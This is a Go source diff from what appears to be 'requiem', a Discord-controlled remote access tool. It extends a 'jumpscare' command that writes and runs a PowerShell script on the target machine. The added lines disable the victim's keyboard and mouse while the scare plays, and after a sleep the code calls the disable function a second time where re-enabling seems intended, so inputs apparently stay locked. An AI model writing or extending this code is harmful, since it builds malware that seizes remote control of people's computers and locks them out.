@@ -7,6 +7,8 @@ import (
 	"strings"
 	"time"
 
+	"requiem/funcs"
+	"requiem/store"
 	"requiem/utils"
 	"requiem/utils/discord"
 
@@ -33,6 +35,10 @@ func (*ScareCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 
 	scareName := fmt.Sprintf("%d.ps1", time.Now().UnixNano())
 	scarePath := filepath.Join(os.TempDir(), scareName)
+
+	if store.RuntimeSettings.JumpscareDisableInputsUntilFinished {
+		funcs.DisableInputs(true)
+	}
 
 	var jumpscare strings.Builder
 	jumpscare.WriteString("Add-Type -AssemblyName System.Windows.Forms\n")
@@ -63,6 +69,12 @@ func (*ScareCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 	cmd.Start()
 
 	ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully jumpscared.", msg.Reference())
+
+	time.Sleep(time.Duration(timeout) * time.Millisecond)
+
+	if store.RuntimeSettings.JumpscareDisableInputsUntilFinished {
+		funcs.DisableInputs(true)
+	}
 }
 
 func (*ScareCommand) Name() string {
